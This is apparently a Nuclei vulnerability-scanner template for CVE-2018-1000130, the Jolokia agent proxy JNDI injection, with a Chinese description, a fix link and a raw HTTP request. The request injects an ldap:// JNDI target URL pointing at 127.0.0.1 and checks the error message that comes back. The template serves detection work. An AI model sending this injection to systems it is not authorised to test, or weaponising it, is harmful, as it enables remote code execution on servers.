id: CVE-2018-1000130
info:
  name: Jolokia Agent Proxy JNDI Code Injection
  author:
  - l0ne1y
  description: |-
    Jolokia agent JNDI注入漏洞
    Jolokia是一个利用JSON通过Http实现JMX远程管理的开源项目，它提供JMX批量操作、安全策略等。Jolokia agent是其中的一个代理。

    Jolokia agent 1.3.7版本中的proxy模式存在安全漏洞。远程攻击者可利用该漏洞在服务器上执行任意的Java代码。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://jolokia.org/#Security_fixes_with_1.5.0
requests:
- matchers:
  - type: word
    part: body
    words:
    - 'Failed to retrieve RMIServer stub: javax.naming.CommunicationException: 127.0.0.1:1389'
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /jolokia/read/getDiagnosticOptions HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.
    Content-Type: application/x-www-form-urlencoded

    {
       "type":"read",
       "mbean":"java.lang:type=Memory",
       "target":{
          "url":"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat"
       }
    }
